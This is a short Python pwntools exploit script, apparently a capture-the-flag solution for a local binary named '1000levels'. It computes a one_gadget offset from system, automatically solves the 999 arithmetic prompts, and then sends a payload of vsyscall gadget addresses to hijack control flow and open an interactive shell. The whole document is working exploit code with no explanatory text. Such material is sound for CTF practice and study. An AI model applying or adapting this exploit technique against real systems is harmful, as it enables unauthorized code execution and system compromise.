from pwn import *

context.log_level = "debug"

p = process("./1000levels")

print p.recv()

#trigger system on stack.
p.sendline("2")
print p.recv()

#send minus
p.sendline("1")
print p.recv()
p.sendline("-1")
print p.recv() #any more

#level start:
system_offset = 0x45390
onegadget_offset = 0x4526a
vsys_gadget = 0xffffffffff600400
offset = onegadget_offset - system_offset
p.sendline(str(offset))

for i in range(999):
    level = p.recvuntil("Answer:")
    ques = level.split(":")[1].split("=")[0].strip()
    res = 0
    if len(ques.split("*")) > 1:
        temp = ques.split("*")
        res = int(temp[0].strip()) * int(temp[1].strip())
    p.sendline(str(res))

data = p.recvuntil("Answer:")
ques = data.split(":")[1].split("=")[0].strip()
res = int(ques.split("*")[0].strip()) * int(ques.split("*")[1].strip())
payload = p64(vsys_gadget) * 10
p.send(payload)
p.interactive()
